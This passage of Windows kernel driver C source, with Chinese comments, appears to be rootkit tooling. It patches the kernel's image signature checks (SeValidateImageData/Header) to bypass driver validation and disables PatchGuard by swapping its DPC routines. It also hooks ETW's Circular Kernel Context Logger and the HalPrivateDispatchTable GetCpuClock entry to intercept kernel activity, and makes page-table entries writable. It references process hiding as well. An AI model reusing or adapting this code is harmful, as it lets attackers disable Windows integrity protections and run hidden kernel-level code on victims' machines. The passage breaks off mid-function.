		*(ULONGLONG*)ptrCALL_Header, *(ULONGLONG*)ptrCALL_Header - kernelBase, *(ULONGLONG*)ptrCALL_HashMemory);


	//*(ULONGLONG*)ptrCALL_Data = SeValidateImageData_RET;
	//*(ULONGLONG*)ptrCALL_Header = SeValidateImageData_RET;



	//*(ULONGLONG*)ptrCALL_HashMemory = SeValidateImageData_RET;
	//char RetVal[] = { 0xB8,0x01,0,0,0,0xC3 };

	//writeSafeMemory(*(ULONGLONG*)ptrCALL_Data, RetVal, sizeof(RetVal));
	//writeSafeMemory(*(ULONGLONG*)ptrCALL_Header, RetVal, sizeof(RetVal));

	//return;

	if (SeValidateImageData_CALLBACK == 0 || SeValidateImageHeader_CALLBACK == 0)
	{
		LOG_DEBUG("Error Map  SeValidateImageData_CALLBACK<%p>  SeValidateImageData_CALLBACK<%p>\n", 
			SeValidateImageData_CALLBACK, SeValidateImageHeader_CALLBACK);
		return;
	}




	if (SeValidateImageData_RET == 0 || SeValidateImageHeader_RET == 0)
	{
		LOG_DEBUG("SeValidateImageData_RET <%p>  SeValidateImageHeader_RET<%p>\n",
			SeValidateImageData_RET, SeValidateImageHeader_RET);
		return;
	}



	DWORD offsetSeValidateImageData = SeValidateImageData_RET - (SeValidateImageData_CALLBACK + 5);
	DWORD offsetSeValidateImageHeader = SeValidateImageHeader_RET - (SeValidateImageHeader_CALLBACK + 5);

	//if (offsetSeValidateImageData )
	//{

	//}
	writeSafeMemory(SeValidateImageData_CALLBACK + 1, &offsetSeValidateImageData, 4);
	writeSafeMemory(SeValidateImageHeader_CALLBACK + 1, &offsetSeValidateImageHeader, 4);

	LOG_DEBUG("DisableFromSeValidateImage   sucess\n")


}



//VOID GetCurrentTime(PTIME_FIELDS TimeFields) {
//	LARGE_INTEGER Time;
//	KeQuerySystemTime(&Time);
//	ExSystemTimeToLocalTime(&Time, &Time);
//	RtlTimeToTimeFields(&Time, TimeFields);
//}

extern NTSTATUS NTAPI _RtlDispatchException(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT Context);

DWORD64 hModBase = 0;
DWORD hModSize = 0;
DWORD64  PDATA_EXCEPTION = 0;
DWORD  PDATA_EXCEPTION_SIZE = 0;

DWORD64 Ptr = 0;
DWORD ModSgin = 0;
PVOID hModSginPtr = 0;;


//typedef struct _UNWIND_INFO_HDR {
//	char Ver3_Flags;
//	char PrologSize;
//	char CntUnwindCodes;
//	char FrReg_FrRegOff;
//}UNWIND_INFO_HDR;


//typedef struct _C_SCOPE_TABLE {
//	ULONG Begin;
//	ULONG End;
//	ULONG Handler;
//	ULONG Target;
//}C_SCOPE_TABLE;


typedef struct _C_Exception {
	ULONG Rva___GSHandlerCheck_SEH_or___C_specific_handler;
	ULONG nCount;
	C_SCOPE_TABLE Table[0x10];
}C_Exception;

void  RtlpCopyContext(PCONTEXT DestContext, PCONTEXT SrcContext)
{
	__int64 result; // rax
	//$C9F1C9CA47C010A40CE81AEC307C9F12* v3; // rcx

	if (SrcContext == DestContext)
	{
		result = SrcContext->ContextFlags & 0x10004F;
		DestContext->ContextFlags = result;
	}
	else
	{
		DestContext->ContextFlags = 0;
		DestContext->ContextFlags = SrcContext->ContextFlags & 0x10000F;
		DestContext->Rip = SrcContext->Rip;
		DestContext->Rbx = SrcContext->Rbx;
		DestContext->Rsp = SrcContext->Rsp;
		DestContext->Rbp = SrcContext->Rbp;
		DestContext->Rsi = SrcContext->Rsi;
		DestContext->Rdi = SrcContext->Rdi;
		DestContext->R12 = SrcContext->R12;
		DestContext->R13 = SrcContext->R13;
		DestContext->R14 = SrcContext->R14;
		DestContext->R15 = SrcContext->R15;
		DestContext->Xmm6 = SrcContext->Xmm6;
		DestContext->Xmm7 = SrcContext->Xmm7;
		DestContext->Xmm8 = SrcContext->Xmm8;
		DestContext->Xmm9 = SrcContext->Xmm9;
		DestContext->Xmm10 = SrcContext->Xmm10;
		DestContext->Xmm11 = SrcContext->Xmm11;
		DestContext->Xmm12 = SrcContext->Xmm12;
		DestContext->Xmm13 = SrcContext->Xmm13;
		DestContext->Xmm14 = SrcContext->Xmm14;
		DestContext->Xmm15 = SrcContext->Xmm15;
		DestContext->SegCs = SrcContext->SegCs;
		DestContext->SegSs = SrcContext->SegSs;
		DestContext->MxCsr = SrcContext->MxCsr;
		DestContext->EFlags = SrcContext->EFlags;
		//result = (__int64)&SrcContext->256;
		//v3 = &DestContext->256;
		//*(_OWORD*)&v3->FltSave.ControlWord = *(_OWORD*)&SrcContext->FltSave.ControlWord;

		//DestContext->Xmm0
		DestContext->Header[0] = SrcContext->Header[0];
		DestContext->Header[1] = SrcContext->Header[1];
		DestContext->Legacy[0] = SrcContext->Legacy[0];
		DestContext->Legacy[1] = SrcContext->Legacy[1];
		DestContext->Legacy[2] = SrcContext->Legacy[2];
		DestContext->Legacy[3] = SrcContext->Legacy[3];
		DestContext->Legacy[4] = SrcContext->Legacy[4];
		DestContext->Legacy[5] = SrcContext->Legacy[5];
		DestContext->Legacy[6] = SrcContext->Legacy[6];
		DestContext->Legacy[7] = SrcContext->Legacy[7];
	}
	return result;
}
typedef int (*_HandleException)(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT Context);
//ExceptionRecord->ExceptionCode

//#include "HideDriver.h"
typedef  void  (NTAPI* _RtlInsertInvertedFunctionTable)(HANDLE hMod, int Size);
typedef  void  (NTAPI* _RtlRemoveInvertedFunctionTable)(HANDLE hMod);
extern _RtlInsertInvertedFunctionTable  RtlInsertInvertedFunctionTable;
extern _RtlRemoveInvertedFunctionTable  RtlRemoveInvertedFunctionTable;
#include "BrotherEncrypt.h"

extern void FlushTlbPtr(PVOID Ptr);

BOOLEAN SetPtrWriteable(PVOID Ptr) {
	MMPTE* pMpte = GetAddressPfn(Ptr);
	if (pMpte == 0){
		return FALSE;
	}
	if (pMpte->u.Hard.Write == 0){
		pMpte->u.Hard.Write = 1;
		FlushTlbPtr(pMpte);
	}
	return TRUE;
 }

BOOLEAN SetPtrNoWrite(PVOID Ptr) {

	MMPTE* pMpte = GetAddressPfn(Ptr);
	if (pMpte == 0) {
		return FALSE;
	}
	if (pMpte->u.Hard.Write == 1) {
		pMpte->u.Hard.Write = 0;
		FlushTlbPtr(pMpte);
	}
	return TRUE;
}

extern void NTAPI _Mod_Encrypt_Header();

NTSTATUS __fastcall V_RtlDispatchException(PEXCEPTION_RECORD ExceptionRecord, PCONTEXT Context) {
	
	//LOG_DEBUG("RtlDispatchException <%p><%p> <%08X>\n", ExceptionRecord, Context->Rip, ExceptionRecord->ExceptionCode);
	if (!(Context->Rip > hModBase && Context->Rip < (hModBase + hModSize)))
		return _RtlDispatchException(ExceptionRecord, Context);


	//KIRQL irql = KeGetCurrentIrql();
	//_Mod_Encrypt_Header();
	//RtlInsertInvertedFunctionTable(hModBase, hModSize);
	//WriteCR8(irql);
	NTSTATUS r = _RtlDispatchException(ExceptionRecord, Context);
	//RtlRemoveInvertedFunctionTable(hModBase);
	//_Mod_Encrypt_Header();
	//WriteCR8(irql);
	return r;
        

	//CONTEXT Context2 = { 0 };
	//

	////return _RtlDispatchException(ExceptionRecord, Context);
	//LOG_DEBUG("SelfMod <%p><hModBase + %08X>\n", ExceptionRecord, Context->Rip - hModBase);

	//for (int E = 0; E < PDATA_EXCEPTION_SIZE; E += 0xC)
	//{

	//	RUNTIME_FUNCTION* pFunctionException = (RUNTIME_FUNCTION*)(_PDATA_EXCEPTION + E);
	//	//LOG_DEBUG("SelfMod <%p><%p>\n", ExceptionRecord, Context->Rip);
	//	DWORD64 BeginAddress = hModBase + pFunctionException->BeginAddress;
	//	DWORD64 EndAddress = hModBase + pFunctionException->EndAddress;
	//	//LOG_DEBUG("FunctionException <%p><%p>\n", BeginAddress, EndAddress);


	//	if (!(Context->Rip > BeginAddress && Context->Rip < EndAddress))
	//		continue;

	//	UNWIND_INFO_HDR* pUnwind = (UNWIND_INFO_HDR*)(hModBase + pFunctionException->UnwindData);

	//	//LOG_DEBUG("pUnwind <%p>\n", pUnwind);


	//	if (pUnwind->Ver3_Flags & 8 == 0)
	//	{
	//		continue;
	//	}
	//	if (pUnwind->Ver3_Flags & 2 == 0)
	//	{
	//		continue;
	//	}
	//	//LOG_DEBUG("pUnwind <%p>  <%X><%X><%X><%X>\n", pUnwind, pUnwind->FrReg_FrRegOff, pUnwind->CntUnwindCodes, pUnwind->PrologSize, pUnwind->Ver3_Flags);
	//	ULONG logSize = pUnwind->CntUnwindCodes * 2;
	//	ULONG alignV = logSize % 4;
	//	ULONG alignZ = logSize / 4;
	//	if (alignV != 0) {
	//		alignZ++;
	//	}
	//	C_Exception* pC_Exception = (C_Exception*)(hModBase + pFunctionException->UnwindData + alignZ * 4 + sizeof(UNWIND_INFO_HDR));

	//	//	LOG_DEBUG("pC_Exception <%p> <%d>\n", pC_Exception, pC_Exception->nCount);

	//	for (size_t i = pC_Exception->nCount; i > 0; --i)
	//	{
	//		DWORD64 BeginAddress = hModBase + pC_Exception->Table[i].Begin;
	//		DWORD64 EndAddress = hModBase + pC_Exception->Table[i].End;

	//		//	LOG_DEBUG("BeginAddress <%p> EndAddress <%p>\n", BeginAddress, EndAddress);

	//		if (Context->Rip > BeginAddress && Context->Rip < EndAddress) {

	//			_HandleException HandleExceptionV = hModBase + pC_Exception->Table[i].Handler;
	//			//	LOG_DEBUG("调用处理函数<%p>\n", HandleExceptionV);

	//			DWORD r = HandleExceptionV(ExceptionRecord, Context);
	//			//EXCEPTION_NONCONTINUABLE
	//			//LOG_DEBUG("r<%d>\n", r);
	//			if (r == 1) {

	//				//_RtlDispatchException(ExceptionRecord, Context);
	//				LOG_DEBUG("--Rsp %p\n", Context->Rsp);
	//				Context->Rip = hModBase + pC_Exception->Table[i].Target;
	//				//Context->Rsp -= 0x60;
	//				//LOG_DEBUG("--Rsp %p\n", Context->Rsp);
	//				LOG_DEBUG("成功找到并处理 %08X\n", ExceptionRecord->ExceptionFlags);
	//				//ExceptionRecord->ExceptionFlags = EXCEPTION_STACK_INVALID;
	//			//	EXCEPTION_CONTINUE_EXECUTION
	//				//EXCEPTION_CONTINUE_EXECUTION
	//				return 1 ;///EXCEPTION_EXECUTE_HANDLER
	//			}


	//		}
	//	}
	//}
	return _RtlDispatchException(ExceptionRecord, Context);
}

DWORD64 _RtlDispatchExceptionJmp = 0;


// 


NTSTATUS NTAPI NtTraceControl(
	ULONG FunctionCode,
	PVOID InBuffer,
	ULONG InBufferLen,
	PVOID OutBuffer,
	ULONG OutBufferLen,
	PULONG ReturnLength);

extern POBJECT_TYPE* HalPrivateDispatchTable;



DWORD* PerfGlobalGroupMask = 0;

//extern POBJECT_TYPE* ExEventObjectType;

typedef struct _WNODE_HEADER
{
	ULONG BufferSize;
	ULONG ProviderId;
	union {
		ULONG64 HistoricalContext;
		struct {
			ULONG Version;
			ULONG Linkage;
		};
	};
	union {
		HANDLE KernelHandle;
		LARGE_INTEGER TimeStamp;
	};
	GUID Guid;
	ULONG ClientContext;
	ULONG Flags;
} WNODE_HEADER, * PWNODE_HEADER;

typedef struct _EVENT_TRACE_PROPERTIES
{
	WNODE_HEADER Wnode;
	ULONG BufferSize;
	ULONG MinimumBuffers;
	ULONG MaximumBuffers;
	ULONG MaximumFileSize;
	ULONG LogFileMode;
	ULONG FlushTimer;
	ULONG EnableFlags;
	union {
		LONG AgeLimit;
		LONG FlushThreshold;
	} DUMMYUNIONNAME;
	ULONG NumberOfBuffers;
	ULONG FreeBuffers;
	ULONG EventsLost;
	ULONG BuffersWritten;
	ULONG LogBuffersLost;
	ULONG RealTimeBuffersLost;
	HANDLE LoggerThreadId;
	ULONG LogFileNameOffset;
	ULONG LoggerNameOffset;
} EVENT_TRACE_PROPERTIES, * PEVENT_TRACE_PROPERTIES;

typedef struct _CKCL_TRACE_PROPERIES
{
	EVENT_TRACE_PROPERTIES Properties;
	ULONG64 Unknown[3];
	UNICODE_STRING ProviderName;
} CKCL_TRACE_PROPERTIES, * PCKCL_TRACE_PROPERTIES;

typedef enum _trace_type {
	start_trace = 1,
	stop_trace = 2,
	query_trace = 3,
	syscall_trace = 4,
	flush_trace = 5
}trace_type;

//		CKCL_TRACE_PROPERTIES* property = (CKCL_TRACE_PROPERTIES*)ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, tag);


//DEFINE_GUID( /* ce1dbfb4-137e-4da6-87b0-3f59aa102cbc */    PerfInfoGuid, 0xce1dbfb4, 0x137e, 0x4da6, 0x87, 0xb0, 0x3f, 0x59, 0xaa, 0x10, 0x2c, 0xbc);

NTSTATUS modify_trace_settings(ULONG type, CKCL_TRACE_PROPERTIES* PropertyQuery) {

	CKCL_TRACE_PROPERTIES* property = (CKCL_TRACE_PROPERTIES*)ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'Tag');
	if (!property) {
		DbgPrintEx(0, 0, "[%s] allocate ckcl trace propertice struct fail \n", __FUNCTION__);
		return STATUS_MEMORY_NOT_ALLOCATED;
	}

	LOG_DEBUG("%d\n", __LINE__);

	// 申请保存名称的空间
	wchar_t* provider_name = (wchar_t*)ExAllocatePoolWithTag(NonPagedPool, 256 * sizeof(wchar_t), 'Tag');
	if (!provider_name)
	{
		DbgPrintEx(0, 0, "[%s] allocate provider name fail \n", __FUNCTION__);
		ExFreePoolWithTag(property, 'Tag');
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	LOG_DEBUG("%d\n", __LINE__);
	// 清空内存
	RtlZeroMemory(property, PAGE_SIZE);
	RtlZeroMemory(provider_name, 256 * sizeof(wchar_t));

	// 名称赋值
	RtlCopyMemory(provider_name, L"Circular Kernel Context Logger", sizeof(L"Circular Kernel Context Logger"));

	RtlInitUnicodeString(&property->ProviderName, (const wchar_t*)provider_name);
	LOG_DEBUG("%d\n", __LINE__);
	// 唯一标识符
	//GUID ckcl_session_guid = { 0x54dea73a, 0xed1f, 0x42a4, { 0xaf, 0x71, 0x3e, 0x63, 0xd0, 0x56, 0xf1, 0x74 } };


	GUID PerfInfoGuid = { 0xce1dbfb4, 0x137e, 0x4da6, {0x87, 0xb0, 0x3f, 0x59, 0xaa, 0x10, 0x2c, 0xbc } };
	// 结构体填充
	property->Properties.Wnode.BufferSize = PAGE_SIZE;
	property->Properties.Wnode.Flags = 0x00020000;
	property->Properties.Wnode.Guid = PerfInfoGuid; //ckcl_session_guid;
	property->Properties.Wnode.ClientContext = 3;
	property->Properties.BufferSize = sizeof(unsigned long);
	property->Properties.MinimumBuffers = 2;
	property->Properties.MaximumBuffers = 2;
	property->Properties.LogFileMode = 0x00000400;
	LOG_DEBUG("%d\n", __LINE__);
	// 执行操作
	unsigned long length = 0;
	//if (type == syscall_trace)
		property->Properties.EnableFlags = 0x00000080;
	NTSTATUS status = NtTraceControl(type, property, PAGE_SIZE, property, PAGE_SIZE, &length);
	LOG_DEBUG("%d\n", __LINE__);
	if (type == query_trace) {
		RtlCopyMemory(PropertyQuery, property, sizeof(CKCL_TRACE_PROPERTIES));
	}
	LOG_DEBUG("%08X\n", status);
	// 释放内存空间
	ExFreePoolWithTag(provider_name, 'Tag');
	ExFreePoolWithTag(property, 'Tag');

	//TraceSessionSettingsClass

	return status;


}






void mGetCpuClockV(LARGE_INTEGER* Large) {
	Large->QuadPart = __rdtsc();
	LOG_DEBUG_I64X(Large->QuadPart);
}






BOOLEAN ZqIsDpcQueueAddress(DWORD64 fAddress) {
	if (fAddress >= kernelBase &&
		fAddress < (kernelBase + KernelBaseSize))
	{
		ULONG OffsetAddress = fAddress - kernelBase;
		for (size_t i = 0; i < pKiInsertQueueDpcCount; i++) {
			if (OffsetAddress >= ArryKiInsertQueueDpcRunTime[i].BeginAddress &&
				OffsetAddress < ArryKiInsertQueueDpcRunTime[i].EndAddress)
			{
				return TRUE;
			}
		}
	}
	return FALSE;
}


BOOLEAN ZqIsSetTimerAddress(DWORD64 fAddress) {
	if (fAddress >= kernelBase &&
		fAddress < (kernelBase + KernelBaseSize))
	{
		ULONG OffsetAddress = fAddress - kernelBase;
		for (size_t i = 0; i < pKiTraceSetTimerCount; i++) {
			if (OffsetAddress >= ArryKiTraceSetTimer[i].BeginAddress &&
				OffsetAddress < ArryKiTraceSetTimer[i].EndAddress)
			{
				return TRUE;
			}
		}
	}
	return FALSE;
}




void _KDEFERRED_ROUTINE(
	_In_ struct _KDPC* Dpc,
	_In_opt_ PVOID DeferredContext,
	_In_opt_ PVOID SystemArgument1,
	_In_opt_ PVOID SystemArgument2
);

void _KDEFERRED_ROUTINE(
	_In_ struct _KDPC* Dpc,
	_In_opt_ PVOID DeferredContext,
	_In_opt_ PVOID SystemArgument1,
	_In_opt_ PVOID SystemArgument2
) {

	LOG_DEBUG_I64X(Dpc);
	LOG_DEBUG_I64X(DeferredContext);
	LOG_DEBUG_I64X(SystemArgument1);
	LOG_DEBUG_I64X(SystemArgument2);
}

KDPC RoutineDpc = { 0 };
DWORD IsPathGuard(ULONG64 Address) {

	DWORD v1 = *((DWORD*)Address);
	DWORD v2 = *((DWORD*)(Address + 4));
	DWORD v3 = *((DWORD*)(Address + 8));

	DWORD bRun = 0;
	if (v1 == 0x1131482E) {
		bRun = 1;
	}
	else if (v1 == 0x48513148 &&
		v2 == 0x50513148) {
		bRun = 2;
	}
	else if (v1 == KiTimerDispatch[0] &&
		v2 == KiTimerDispatch[1] &&
		v3 == KiTimerDispatch[2]) {
		bRun = 3;
	}
	return bRun;
}

BOOLEAN bLogGetCpu = FALSE;
HANDLE hThreadID = 0;



void CheckStackWithClock(DWORD64 dStack) {


	DWORD64 pQwordStackf = dStack + 0x210;
	DWORD64 _EtwTraceDpcEnqueueEvent = *((DWORD64*)pQwordStackf);

	//// 41BC49
	//DWORD64 pQwordStackTimerf = dStack + 0x220;
	//DWORD64 _KisetTimerEx = *((DWORD64*)pQwordStackTimerf);


	DWORD64 pKiTraceSetTimerf = dStack + 0x1A0;
	DWORD64 _KiTraceSetTimer = *((DWORD64*)pKiTraceSetTimerf);


	if (ZqIsDpcQueueAddress(_EtwTraceDpcEnqueueEvent)) {
		// 最好是采用回溯定位加载

		DWORD64 pQwordStackfEdi = dStack + 0x210 - 0x78; //EDI 保存近期EDI 就是该值
		DWORD64 _EdiVal = *((DWORD64*)pQwordStackfEdi);
		PKDPC pDpc = (PKDPC)_EdiVal;

		char* pFun = pDpc->DeferredRoutine;

		DWORD bRun = IsPathGuard(pFun);
		if (bRun) {
			LOG_DEBUG("PathGuard Dpc %d\n", bRun);
			pDpc->DeferredRoutine = _KDEFERRED_ROUTINE;
		}
	}
	else if (ZqIsSetTimerAddress(_KiTraceSetTimer)) {


		//LOG_DEBUG("RemoveFlushDpcTimer_KiTimer\n");
		RemoveFlushDpcTimer_KiTimer();
	}



}


void mGetCpuClock(LARGE_INTEGER* Large, DWORD64 p, ULONG a1) {

	Large->QuadPart = __rdtsc();
	DWORD64 dStack = (DWORD64)_AddressOfReturnAddress();

	CheckStackWithClock(dStack);

	//  41DC0A

	//LOG_DEBUG("PathGuard Timer %d\n", bRun);
	//for (size_t i = 0; i < 0x300; i += 8) {

	//	DWORD64 pQwordStackTEST = dStack + i;
	//	DWORD64 _TEST = *((DWORD64*)pQwordStackTEST);

	//	if (kernelBase + 0x51EA06 == _TEST) {
	//		LOG_DEBUG_08X(i);
	//	}
	//}

	// 51EA06


}
//NTKERNELAPI NTSTATUS NtSetSystemTime(LARGE_INTEGER* Time, ULONG Flags);



LARGE_INTEGER vGetCpuClock() {

	LARGE_INTEGER Large;
	Large.QuadPart = __rdtsc();
	DWORD64 dStack = (DWORD64)_AddressOfReturnAddress();
	CheckStackWithClock(dStack);
	return Large;
}



extern char* _ASM_MOV_DIL(char* pAdr, int num);

extern char* _ASM_JMP(char* pAdr, int num);

extern char* _ASM_MOVE_R10(char* pAdr, int num);

extern char* _ASM_MOV_R11(char* pAdr, int num);

extern BOOLEAN HideProcess(HANDLE pid, int Type);

extern char* _ASM_TEST_FAR(char* pAdr, int num, int Lenth);


//DWORD64 










void  Pvoid() {

	LOG_DEBUG("Hook  Use \n");
}


void EnableEtwTrace(DWORD64* EtwpHostSiloStatePtr, ULONG EtwFlags) {
	DWORD64 pEtwpHostSiloState = *((DWORD64*)EtwpHostSiloStatePtr);
	DWORD v9 = *(DWORD*)(pEtwpHostSiloState + 0x1080);
	ULONG pIndex = 0;
	_BitScanForward(&pIndex, v9);
	INT8 pA3 = *((INT8*)(pEtwpHostSiloState + 0x1070 + 2 * pIndex));
	DWORD64 v12 = 0x20i64 * (unsigned int)pIndex + pEtwpHostSiloState + 0x10A4;
	*(DWORD*)(v12 + 4 * (EtwFlags >> 29)) = (0x1FFFFFFF & EtwFlags);

	ETW_FLAGS EtwF; 
	EtwF.EtwFlags = EtwFlags;

	LOG_DEBUG("Etw<Flags:%08X> %d", EtwF.u.Flags, EtwF.u.offset);

	DWORD* PerfGlobalGroupMask4 = PerfGlobalGroupMask + EtwF.u.offset;
	LOG_DEBUG_I64X(PerfGlobalGroupMask);
	LOG_DEBUG_I64X(PerfGlobalGroupMask4);
	LOG_DEBUG_08X(*PerfGlobalGroupMask4);
	*PerfGlobalGroupMask4 = (*PerfGlobalGroupMask4) | EtwF.u.Flags;
	LOG_DEBUG_08X(*PerfGlobalGroupMask4);


}


PVOID GetCkclWmiLoggerContextPtr(DWORD64* EtwpHostSiloStatePtr) {

	DWORD64 pEtwpHostSiloState = *((DWORD64*)EtwpHostSiloStatePtr);
	DWORD v9 = *(DWORD*)(pEtwpHostSiloState + 0x1080);
	ULONG pIndex = 0;
	_BitScanForward(&pIndex, v9);
	INT8 pA3 = *((INT8*)(pEtwpHostSiloState + 0x1070 + 2 * pIndex));

	DWORD64 v13 = *(DWORD64*)(pEtwpHostSiloState + 0x1C8);

	PVOID CkclWmiLoggerContext = *(PVOID**)(8 * pA3 + v13);
	return CkclWmiLoggerContext;
}



VOID NTAPI PollingTimer(PKDPC pDpc, PVOID pContext, PVOID SysArg1, PVOID SysArg2) {


	LOG_DEBUG_I64X(pDpc);

	return;
}




//

VOID HOOK_BEGIN()
{
	RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);

	easy_anti_patchguard(kernelBase);













	Disable_PathGuard_Handler(kernelBase);

	RemoveFlushDpcTimer_KiTimer();

	RemoveFlushDpcQueue();



	if (pEtwpHostSiloState == 0)
	{
		MOD_INFO kModInfo = { 0 };
		if (NT_SUCCESS(InitializationModInfo(kernelBase, &kModInfo))) {
			LPVOID Ptr = 0; DWORD nSize = 0;
			if (NT_SUCCESS(ZqGetSectionPtr(&kModInfo, "ALMOSTRO", &Ptr, &nSize)))
			{
				pEtwpHostSiloState = (DWORD64)Ptr + 8;
				LOG_DEBUG_I64X(pEtwpHostSiloState);
			}
		}
		else
		{
			LOG_DEBUG(" InitializationModInfo Error\n");
		}

	}


	ULONG64 KiInsertQueueDpc = _CODE_GET_REAL_ADDRESS_0(_ASM_GET_CALL(KeInsertQueueDpc, 1), 1);
	PerfGlobalGroupMask = (DWORD*)_CODE_GET_REAL_ADDRESS_0(_ASM_TEST_FAR(KiInsertQueueDpc, 1, 0), 2);

	if (pEtwpHostSiloState != 0){
		//监控DPC
		EnableEtwTrace(pEtwpHostSiloState, 0x20040000);
		//监控Timer
		EnableEtwTrace(pEtwpHostSiloState, 0x40020000);
	}
	PVOID CkclWmiLoggerContext = GetCkclWmiLoggerContextPtr(pEtwpHostSiloState);;//*(PVOID**)(8 * pA3 + v13);//pEtwpDebuggerDataSilo[0x2];

	LOG_DEBUG_I64X(CkclWmiLoggerContext);

	ULONG64* pGetCpuClock = 0;
	if (OsVersion.dwBuildNumber >= 22000 || OsVersion.dwBuildNumber < 7601){
		pGetCpuClock = (void**)((unsigned long long)CkclWmiLoggerContext + 0x18);
	}
	else
	{
		pGetCpuClock = (void**)((unsigned long long)CkclWmiLoggerContext + 0x28);
	}
	

	LOG_DEBUG_I64X(pGetCpuClock);

	LOG_DEBUG_I64X(*pGetCpuClock);


	//DWORD* pFlags = (void**)((unsigned long long)CkclWmiLoggerContext + 0x340);

	//LOG_DEBUG_08X(*pFlags);




	//DWORD* PerfGlobalGroupMask4 = PerfGlobalGroupMask + 1;
	//LOG_DEBUG_I64X(PerfGlobalGroupMask);
	//LOG_DEBUG_I64X(PerfGlobalGroupMask4);
	//LOG_DEBUG_08X(*PerfGlobalGroupMask4);
	//*PerfGlobalGroupMask4 = (*PerfGlobalGroupMask4) | 0x40000;
	//LOG_DEBUG_08X(*PerfGlobalGroupMask4);


	//DWORD* ICALL_MASK = (DWORD*)((DWORD64)PerfGlobalGroupMask + 0x14);
	//LOG_DEBUG_I64X(*ICALL_MASK);

	//*ICALL_MASK = 2;


	if (OsVersion.dwBuildNumber < 19041) {

		*pGetCpuClock = vGetCpuClock;

	}
	else
	{
		LOG_DEBUG_I64X(HalPrivateDispatchTable);

		PVOID* pfGetCpuClock = (PVOID*)((DWORD64)HalPrivateDispatchTable + 0x450);

		LOG_DEBUG_I64X(pfGetCpuClock);

		LOG_DEBUG_I64X(*pfGetCpuClock);

		*pfGetCpuClock = mGetCpuClock;

		*pGetCpuClock = 2;

		LOG_DEBUG_I64X(*pGetCpuClock);
	}


	//LOG_DEBUG_I64X(HalPrivateDispatchTable);

	//PVOID *  pfGetCpuClock = (PVOID *)((DWORD64)HalPrivateDispatchTable + 0x450);

	//LOG_DEBUG_I64X(pfGetCpuClock);

	//LOG_DEBUG_I64X(*pfGetCpuClock);

	//*pfGetCpuClock = mGetCpuClock;

	//*pGetCpuClock = 2;

	//LOG_DEBUG_I64X(*pGetCpuClock);



	//typedef void (*fEtwTraceDpcEnqueueEvent)(
	//	INT64 pTrace,
	//	PVOID NormalRoutine,
	//	int NormalContext,
	//	int SystemArgument1,
	//	int SystemArgument2,
	//	int SystemArgument3
	//);

	//fEtwTraceDpcEnqueueEvent TraceDpc = (fEtwTraceDpcEnqueueEvent)(kernelBase + 0x5A2464);

	//KDPC Dpc = { 0 };

	//TraceDpc(&Dpc, 0, 0, 0, 0, 0);
	LOG_DEBUG_I64X(_KDEFERRED_ROUTINE); 
	LOG_DEBUG_I64X(&RoutineDpc);
	KeInitializeDpc(&RoutineDpc, _KDEFERRED_ROUTINE, 0);
	KeInsertQueueDpc(&RoutineDpc, 0, 0);



	KeInitializeTimer(&kTimer);

	KeInitializeDpc(&kDpc, PollingTimer, 0);



	pRunFlags = (*KiWaitNever ^ __ROR8__(
		(unsigned __int64)&kTimer ^ _byteswap_uint64((unsigned __int64)&kDpc ^ *KiWaitAlways),
		*KiWaitNever));


	LARGE_INTEGER _Large; _Large.QuadPart = 0;

	KeSetTimer(&kTimer, _Large, &kDpc);
	




	//UCHAR uFlags = __readgsbyte(0x853);
	//LOG_DEBUG("uFlags :%08X\n", uFlags);
	//if (uFlags  == 0) {
	//	__writegsbyte(0x853, uFlags | 2);
	//	LOG_DEBUG("uFlags :%08X\n", uFlags | 2);
	//}

	//LARGE_INTEGER Large;
	//bLogGetCpu = TRUE;
	//hThreadID = PsGetCurrentThreadId();
	//indirect_rax(mGetCpuClockV, &Large);
	//bLogGetCpu = FALSE;
	//LOG_DEBUG_I64X(Large.QuadPart);

	//IniInputData();

	//IniHideProcess();


	//Guard_Dispatch_Icall

	//  HalpTimerQueryHostPerformanceCounter


	// RtlInsertInvertedFunctionTable

	//  异常处理

	//EnumDriver();

	//KernelShimEngineProvider

	//EtwActivityIdControl()

	//EtwEventEnabled()

	//PERF_CONTEXT_SWITCH
	//RegistryProvGuid

	NTSTATUS Status = 0;// EtwRegister(&KernelProvGuid, EtwpTracingProvEnableTimeCallback, 0x20000, &hTimeEtw);



	//KeSetTimerEx()


	//EtwEventEnabled

	//LOG_DEBUG("EtwRegister  %08X\n", Status);

	//EVENT_DESCRIPTOR Etw_Descriptor;
	////etw

	//EtwEventEnabled(hTimeEtw, &Etw_Descriptor);

	//sizeof(LIST_ENTRY)

	Status = STATUS_SUCCESS;
	OsVersion.dwOSVersionInfoSize = sizeof(OsVersion);
	Status = RtlGetVersion((PRTL_OSVERSIONINFOW)&OsVersion);

	

	UNICODE_STRING FuncPoSetHiberRange = { 0 };
	RtlInitUnicodeString(&FuncPoSetHiberRange, L"PoSetHiberRange");
	ULONGLONG  pPoSetHiberRange = (ULONGLONG)GetProcAddress_Kernel(kernelBase, "PoSetHiberRange");
	if (pPoSetHiberRange != 0) {
		KiBugCheckActive = (DWORD*)_CODE_GET_REAL_ADDRESS_0(_ASM_MOV_EAX_2((char*)pPoSetHiberRange, 1), 2);
		//*KiBugCheckActive = ((*KiBugCheckActive) ^ 3);
		LOG_DEBUG("KiBugCheckActive  %I64X\n", KiBugCheckActive);
		//KeGetCurrentPrcb();
		//KeGetCurrentPrcb()
	}



	if (OsVersion.dwMajorVersion == 6 && OsVersion.dwMinorVersion == 1)
	{
		TimerTableOffset = 0;
	}
	else if (OsVersion.dwBuildNumber >= 17763 && OsVersion.dwBuildNumber < 18362) {

		TimerTableOffset = 0x3680;
	}
	else if (OsVersion.dwBuildNumber >= 18362 && OsVersion.dwBuildNumber < 19041) {
		TimerTableOffset = 0x3680;
	}
	else if (OsVersion.dwBuildNumber >= 19041 && OsVersion.dwBuildNumber < 20384) {
		TimerTableOffset = 0x3940;
	}


	LARGE_INTEGER TimesN;
	KeQuerySystemTime(&TimesN);
	DWORD64 TimeS = TimesN.QuadPart / 10000000;

	LOG_DEBUG("TimeS %llu\n", TimeS);


	TIME_FIELDS TimeFields;
	LARGE_INTEGER Time;
	KeQuerySystemTime(&Time);
	ExSystemTimeToLocalTime(&Time, &Time);
	RtlTimeToTimeFields(&Time, &TimeFields);


	


	//133471128

//#ifndef DEBUG
	//13360702733   13363273973
	//13375400453
	// 13374754421
